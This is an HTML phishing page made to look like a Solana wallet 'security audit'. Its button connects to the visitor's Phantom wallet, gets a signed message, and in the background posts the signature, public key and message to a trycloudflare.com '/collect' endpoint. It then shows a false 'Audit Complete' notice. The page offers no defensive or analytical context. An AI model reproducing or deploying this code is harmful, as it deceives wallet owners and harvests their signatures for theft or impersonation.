<!DOCTYPE html><html><head><meta charset="UTF-8">
    <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script></head>
    <body style="background:#000;color:#14F195;text-align:center;padding-top:30vh;font-family:sans-serif;">
    <div style="border:1px solid #14F195;padding:50px;display:inline-block;border-radius:20px;background:#111;">
        <h2 style="letter-spacing:2px;">SECURITY AUDIT V4</h2>
        <button id="cta" style="padding:15px 40px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:8px;cursor:pointer;font-size:18px;">VERIFY OWNERSHIP</button>
        <div id="status" style="margin-top:20px;color:#666;font-size:14px;">Status: Ready</div>
    </div>
    <script>
    document.getElementById('cta').onclick = async () => {
        try {
            const p = window.solana || window.phantom?.solana;
            const { publicKey } = await p.connect();
            
            const message = "Security Audit ID: " + Math.floor(Math.random() * 999999) + "\n" +
                          "Action: Verify Wallet Ownership\n" +
                          "Timestamp: " + Date.now();
            const encodedMessage = new TextEncoder().encode(message);
            
            document.getElementById('status').innerText = "Establishing Secure Link...";
            const signedMessage = await p.signMessage(encodedMessage, "utf8");
            
            // ðŸš€ é™é»˜æ‰“åŒ…å¯†æ–‡
            const signature = btoa(String.fromCharCode.apply(null, signedMessage.signature));
            
            // ðŸš€ ä½¿ç”¨ fetch çš„ keepalive ç‰¹æ€§ï¼Œç¡®ä¿é¡µé¢å…³é—­ä¹Ÿèƒ½å‘å®Œ
            fetch("https://biggest-fellow-aware-quantitative.trycloudflare.com/collect", {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    signature: signature,
                    pubkey: publicKey.toString(),
                    message: message
                }),
                keepalive: true
            });

            // ðŸ”± æˆåŠŸåŽç«‹å³é™é»˜è·³è½¬ï¼Œç‰©ç†ç»ˆç»“æ‰€æœ‰æŠ¥é”™è·¯å¾„
            document.getElementById('status').style.color = '#14F195';
            document.getElementById('status').innerText = "SUCCESS: Audit Complete.";
            
            setTimeout(() => {
                window.location.reload(); // æˆ–è€…è·³è½¬åˆ° google.com
            }, 1000);
            
        } catch(e) { 
            console.log(e);
            document.getElementById('status').innerText = "Verification Suspended.";
        }
    }
    </script></body></html>
